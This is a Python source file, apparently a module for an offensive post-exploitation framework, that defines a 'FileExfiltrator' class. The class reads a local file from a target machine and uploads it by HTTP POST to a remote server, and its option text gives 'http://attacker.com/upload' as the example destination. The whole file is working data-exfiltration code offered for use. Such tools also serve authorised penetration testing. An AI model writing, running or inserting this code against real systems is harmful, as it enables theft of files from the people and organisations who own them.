import requests
import os
from core.base_module import BaseModule
from rich.console import Console

class FileExfiltrator(BaseModule):
    """Exfiltrates (uploads) a local file to a remote server."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'LOCAL_FILE_PATH': ['', 'The full path of the file to exfiltrate from the target.'],
            'REMOTE_URL': ['', 'The URL to upload the file to (e.g., http://attacker.com/upload).']
        }

    def run(self, options):
        """
        Executes the file exfiltration process.
        """
        local_file_path = options.get('LOCAL_FILE_PATH')
        remote_url = options.get('REMOTE_URL')
        console = Console()

        if not local_file_path or not remote_url:
            console.print("[!] LOCAL_FILE_PATH and REMOTE_URL must be set.", style="bold red")
            return

        if not os.path.exists(local_file_path):
            console.print(f"[!] Local file not found: {local_file_path}", style="bold red")
            return

        console.print(f"[*] Preparing to exfiltrate '{local_file_path}' to {remote_url}...")

        try:
            with open(local_file_path, 'rb') as f:
                file_data = f.read()
            
            filename = os.path.basename(local_file_path)
            files = {'file': (filename, file_data)}

            console.print(f"[*] Uploading {len(file_data)} bytes...")
            response = requests.post(remote_url, files=files, timeout=60)

            if response.status_code >= 200 and response.status_code < 300:
                console.print(f"[bold green][+] File exfiltrated successfully! Server responded with status {response.status_code}.[/bold green]")
                console.print(f"Server response: {response.text}")
            else:
                console.print(f"[!] Server returned an error (Status {response.status_code}): {response.text}", style="bold red")

        except requests.exceptions.RequestException as e:
            console.print(f"[!] Failed to upload file: {e}", style="bold red")
        except FileNotFoundError:
            # This is already checked, but as a fallback.
            console.print(f"[!] File not found: {local_file_path}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
